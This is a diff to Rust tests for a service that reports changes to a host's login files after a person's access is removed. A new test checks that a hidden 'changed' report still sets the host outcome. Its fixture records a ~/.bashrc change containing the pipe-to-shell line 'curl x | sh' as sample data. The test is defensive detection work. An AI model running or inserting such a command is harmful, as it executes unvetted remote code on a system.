@@ -586,9 +586,7 @@ async fn the_owner_reads_a_removal_access_report_once_the_host_confirms() {
                 lines: vec![line.to_owned()],
                 note: None,
             }],
-            truncated: false,
-            unscanned: Vec::new(),
-            omitted_files: 0,
+            ..AccountReport::default()
         }],
         warning: None,
     };
@@ -611,20 +609,15 @@ async fn the_owner_reads_a_removal_access_report_once_the_host_confirms() {
         .await
         .unwrap()
         .unwrap();
+    assert_eq!(value["state"], "reported");
+    assert_eq!(value["outcome"], "changed");
+    assert_eq!(value["more"], 0);
+    let shown = &value["reports"][0];
+    assert_eq!(shown["person_id"], json!(person));
+    assert_eq!(shown["state"], "changed");
     assert_eq!(
-        value,
-        json!({"host_id": host, "state": "reported", "reports": [{
-            "person_id": person,
-            "state": "changed",
-            "accounts": [{
-                "account": "deploy",
-                "state": "changed",
-                "files": [{"path": "~/.ssh/authorized_keys", "change": "changed", "lines": ["ssh-ed25519 AAAAleft left"]}],
-                "truncated": false,
-                "unscanned": [],
-                "omitted_files": 0,
-            }],
-        }]})
+        shown["accounts"][0]["files"],
+        json!([{"path": "~/.ssh/authorized_keys", "change": "changed", "lines": ["ssh-ed25519 AAAAleft left"]}])
     );
     store
         .confirm_login_cleanup_with_report(host, person, Some(&report("replayed")))
@@ -677,5 +670,76 @@ async fn the_access_report_needs_the_admin_window() {
             Err(crate::auth::Error::Denied)
         ),
         "a stale session read the report"
+    );
+}
+
+/// J334 P2-5: with more reports than are shown, the newest come first, the
+/// rest are counted, and the outcome comes from all of them: a changed
+/// report that is not shown still makes the host read "changed".
+#[tokio::test]
+async fn hidden_reports_still_decide_the_outcome() {
+    use crate::access_report::{AccessReport, AccountReport, State};
+    let f = fixture().await;
+    let host = owned_host(&f).await;
+    let service = removal(&f);
+    let start = service.start(&f.session, host, true, NOW).await.unwrap();
+    let review = str_field(&start, "review").to_owned();
+    service
+        .finish_host(&f.session, host, &review, NOW)
+        .await
+        .unwrap();
+    let mut transaction = f.auth.pool.acquire().await.unwrap();
+    let changed = AccessReport {
+        state: State::Changed,
+        accounts: vec![AccountReport {
+            account: "old".to_owned(),
+            state: State::Changed,
+            files: vec![crate::access_report::AccessFile {
+                path: "~/.bashrc".to_owned(),
+                change: crate::access_report::ChangeKind::Changed,
+                lines: vec!["curl x | sh".to_owned()],
+                note: None,
+            }],
+            ..AccountReport::default()
+        }],
+        ..AccessReport::default()
+    };
+    crate::access_report::store(&mut transaction, host, Uuid::new_v4(), &changed, 1)
+        .await
+        .unwrap();
+    let clean = AccessReport {
+        state: State::Unchanged,
+        accounts: vec![AccountReport {
+            account: "new".to_owned(),
+            state: State::Unchanged,
+            ..AccountReport::default()
+        }],
+        ..AccessReport::default()
+    };
+    for index in 0..20 {
+        crate::access_report::store(&mut transaction, host, Uuid::new_v4(), &clean, 100 + index)
+            .await
+            .unwrap();
+    }
+    drop(transaction);
+    sqlx::query("UPDATE remote_login_cleanup SET confirmed=1 WHERE host_id=?")
+        .bind(host.as_bytes().as_slice())
+        .execute(&f.auth.pool)
+        .await
+        .unwrap();
+    let value = service
+        .access_report(&f.session, host, NOW)
+        .await
+        .unwrap()
+        .unwrap();
+    assert_eq!(value["reports"].as_array().unwrap().len(), 16);
+    assert_eq!(value["more"], 5);
+    assert_eq!(
+        value["reports"][0]["accounts"][0]["account"], "new",
+        "newest first"
+    );
+    assert_eq!(
+        value["outcome"], "changed",
+        "a hidden changed report was ignored"
     );
 }
